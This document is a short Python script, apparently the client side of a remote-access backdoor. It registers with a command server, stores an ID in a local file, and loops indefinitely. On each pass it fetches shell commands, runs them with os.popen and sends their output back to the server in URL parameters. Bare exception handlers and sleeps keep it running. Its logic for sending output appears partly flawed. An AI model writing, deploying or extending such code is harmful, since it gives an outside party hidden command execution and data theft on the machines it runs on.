import requests
import glob
import time
import os

host = "0.0.0.0"
session = requests.Session()

if "id" not in glob.glob("*.*"):
    while True:
        try:
            response = session.get(f"http://{host}/get_id/",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            break
        except:
            time.sleep(30)
    with open("id","w") as file:
        file.write(response.text)

with open("id","r") as file:
    id = int(file.read())



while True:
    try:
        while True:
            try:
                response1 = session.get(f"http://{host}/blank/",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
                break
            except:
                time.sleep(20)

        while response1.text == "":
            time.sleep(5)
            response1 = session.get(f"http://{host}/get_command/?id={id}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})

        out = "".join(list(os.popen(str(response1.text))))
        response2 = session.get(f"http://{host}/666",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
        while response2.status_code != 200:
            response2 = session.get(f"http://{host}/push_command/?id={id}&data={out}&command={response1.text}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            time.sleep(5)
        time.sleep(10)
    except:
        time.sleep(20)
